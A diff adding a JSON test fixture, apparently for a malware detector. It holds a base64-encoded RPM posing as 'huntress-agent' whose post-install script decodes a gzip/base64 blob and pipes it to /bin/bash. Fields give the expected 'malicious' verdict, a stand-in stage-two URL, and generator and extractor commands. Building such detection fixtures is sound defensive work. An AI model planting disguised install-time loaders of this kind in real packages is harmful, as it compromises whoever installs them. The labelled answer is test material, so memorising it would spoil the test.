@@ -1,0 +1,12 @@
+{
+ "material": "7avu2wMAAAAAAWh1bnRyZXNzLWFnZW50LTEuMC0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAUAAAAAAAAAAAAAAAAAAAAAjq3oAQAAAAAAAAABAAAABAAAA+gAAAAEAAAAAAAAAAEAAAAAAAAAAI6t6AEAAAAAAAAABQAAAVgAAAPoAAAABgAAAAAAAAABAAAD6QAAAAYAAAAPAAAAAQAAA+oAAAAGAAAAEwAAAAEAAAQAAAAABgAAABUAAAABAAAEPgAAAAgAAAFOAAAAAWh1bnRyZXNzLWFnZW50ADEuMAAxAGRlc2NyaXB0b3JfM2M0ZDVlNmY9Ikg0c0lBQUFBQUFBQ0F6Mk96UXJDTUJDRVgwaGIrM3NROWhFRUVlOWhUZFoyTVUxQ3Npa2U4dkRtVW8vRE45OHdPd3pGb2xzeUxnUXZUR3VKM2hLd1M0TFdVaXc3UmNOYVlFUExtbjFPQlVWUWYrRFpUZVBjWExxNW9NRWdGQ0dHVFFXZmhGMnA5a0pLKyt3RStwb29wR05UaFdwWGVvclpIWFdOVzBCZW5HSURqL3Z0UE9qUlREUy9TNDRXVnBHUXJtMWI1Lytnb1c5VkxEWHM5bnJNdEtuL0FiV2FkMlBLQUFBQSIKZWNobyAiJGRlc2NyaXB0b3JfM2M0ZDVlNmYiIHwgYmFzZTY0IC1kIHwgZ3VuemlwIHwgL2Jpbi9iYXNoCgAvYmluL2Jhc2gAH4sIAAAAAAAAAAAAAAAAAAAAAAA=",
+ "rep": "rpm",
+ "transform": null,
+ "key": "",
+ "expected": "v=3|language=bash|role=installer|verdict=malicious|attack=T1546.016|adapter=rpm_postin|stage_count=2|steps=install_package,run_postin|campaign_id=RPM-3c4d5e6f|url=https://rpm-3c4d5e6f.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf 'descriptor_<id>=\"%s\"\\necho \"$descriptor_<id>\" | base64 -d | gunzip | /bin/bash\\n' \"$M\" > body.sh; python3 -I pkg_rpm_gen.py pkg_rpm_postin.rpm 1024 /bin/bash body.sh  (stdlib struct RPM v3 writer: lead + sig header + main header; file(1): RPM v3.0 bin); material = base64 -w0 pkg_rpm_postin.rpm",
+ "oracle_cmd": "PYTHONPATH=tools/pylib-rpm .venv/bin/python -I -c \"import rpmfile,sys,re,base64,gzip; r=rpmfile.open(sys.argv[1]); s=r.headers['postin'].decode(); print(gzip.decompress(base64.b64decode(re.search(r'H4sI[A-Za-z0-9+/=]*',s).group(0))).decode()); print(r.headers['postinprog'])\" pkg_rpm_postin.rpm   (rpmfile 2.2.1 header reader, pip --target tools/pylib-rpm)",
+ "source_file": "pkg_rpm_postin.rpm",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=rpm) -> pkg_scripts -> script body readers"
+}
